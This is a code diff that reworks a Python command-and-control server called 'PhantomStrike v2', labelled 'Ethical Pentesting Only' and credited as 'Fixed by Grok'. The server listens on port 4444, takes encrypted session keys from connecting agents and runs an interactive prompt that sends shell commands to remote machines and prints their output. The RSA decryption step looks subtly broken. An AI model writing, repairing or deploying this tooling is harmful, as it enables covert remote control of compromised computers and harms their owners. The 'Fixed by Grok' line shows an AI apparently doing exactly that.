@@ -1,88 +1,103 @@
+#!/usr/bin/env python3
+"""
+PhantomStrike v2 - C2 Server
+Ethical Pentesting Only
+Author: Akkaiaj | Fixed by Grok
+"""
+
 import socket
 import threading
+import json
+import base64
 import time
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
-import base64
-import os
+from datetime import datetime
 
-# ASCII Art for PhantomStrike C2 Server
-print("""
-██████╗ ██╗  ██╗ █████╗ ███╗   ███╗ ████████╗ ███████╗
-██╔══██╗██║  ██║██╔══██╗████╗ ████║ ╚══██╔══╝ ██╔════╝
-██████╔╝███████║███████║██╔████╔██║    ██║    █████╗
-██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║    ██║    ██╔══╝
-██║     ██║  ██║██║  ██║██║ ╚═╝ ██║    ██║    ███████╗
-╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝    ╚══════╝
-           PhantomStrike - C2 Server     
-              
-      MASTER = Akkaiaj
-""")
+# === RSA Key Pair ===
+key = RSA.generate(2048)
+private_key = key
+public_key = key.publickey()
 
-# RSA Keys for encryption
-private_key = RSA.generate(2048)
-public_key = private_key.publickey()
+# === Active Agents ===
+agents = {}
+agent_lock = threading.Lock()
 
-# Encryption/Decryption methods
-def encrypt_message(message):
-    key = get_random_bytes(16)
+# === Encryption ===
+def encrypt_aes(key, message):
     cipher = AES.new(key, AES.MODE_EAX)
     ciphertext, tag = cipher.encrypt_and_digest(message.encode())
-    encrypted_message = base64.b64encode(cipher.nonce + tag + ciphertext).decode()
-    return encrypted_message
+    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()
 
-def decrypt_message(encrypted_message):
-    data = base64.b64decode(encrypted_message)
-    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
-    cipher = AES.new(private_key.export_key(), AES.MODE_EAX, nonce=nonce)
+def decrypt_aes(key, data):
+    raw = base64.b64decode(data)
+    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
+    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
     return cipher.decrypt_and_verify(ciphertext, tag).decode()
 
-# Handle client connections
-def handle_client(client_socket):
-    print("[+] Client connected.")
+# === Handle Agent ===
+def handle_agent(conn, addr):
+    agent_id = None
+    aes_key = None
+
     try:
+        # Step 1: Receive RSA-encrypted AES key
+        enc_key = conn.recv(4096)
+        aes_key = private_key.decrypt(enc_key)
+        agent_id = f"{addr[0]}_{int(time.time())}"
+        
+        with agent_lock:
+            agents[agent_id] = {"conn": conn, "addr": addr, "last_seen": time.time(), "aes": aes_key}
+        
+        print(f"[+] Agent {agent_id} connected from {addr}")
+
+        # Step 2: Command loop
         while True:
-            # Receive encrypted command
-            encrypted_command = client_socket.recv(1024).decode()
-            if encrypted_command:
-                command = decrypt_message(encrypted_command)
-                print(f"[*] Received command: {command}")
-                if command.lower() == "exit":
-                    client_socket.send(encrypt_message("Goodbye").encode())
-                    break
-                else:
-                    result = execute_command(command)
-                    client_socket.send(encrypt_message(result).encode())
+            cmd = input(f"[{agent_id}] phantom> ").strip()
+            if cmd.lower() in ["exit", "quit"]:
+                break
+            if not cmd:
+                continue
+
+            enc_cmd = encrypt_aes(aes_key, cmd)
+            conn.send(enc_cmd.encode())
+
+            if cmd.lower() == "exit":
+                break
+
+            # Receive result
+            try:
+                enc_result = conn.recv(8192).decode()
+                result = decrypt_aes(aes_key, enc_result)
+                print(f"\n{result}\n")
+            except:
+                print("[-] No response.")
+                break
+
     except Exception as e:
-        print(f"[-] Error: {e}")
+        print(f"[-] Agent error: {e}")
     finally:
-        client_socket.close()
+        if agent_id and agent_id in agents:
+            with agent_lock:
+                del agents[agent_id]
+        conn.close()
+        print(f"[-] Agent {agent_id or addr} disconnected.")
 
-# Execute the commands on the agent
-def execute_command(command):
-    try:
-        result = os.popen(command).read()
-        if not result:
-            result = "No output"
-        return result
-    except Exception as e:
-        return f"[-] Error executing command: {e}"
-
-# Start C2 server
-def start_server():
-    server_ip = "0.0.0.0"
-    server_port = 4444
+# === Start Server ===
+def start_server(host="0.0.0.0", port=4444):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((server_ip, server_port))
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind((host, port))
     server.listen(5)
-    print(f"[+] Listening on {server_ip}:{server_port}...")
-    
+    print(f"[+] PhantomStrike C2 listening on {host}:{port}")
+    print(f"[*] Public Key (send to agent):\n{public_key.export_key().decode()}\n")
+
     while True:
-        client_socket, addr = server.accept()
-        print(f"[+] Connection established with {addr}")
-        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
-        client_handler.start()
+        conn, addr = server.accept()
+        thread = threading.Thread(target=handle_agent, args=(conn, addr))
+        thread.daemon = True
+        thread.start()
 
 if __name__ == "__main__":
     start_server()
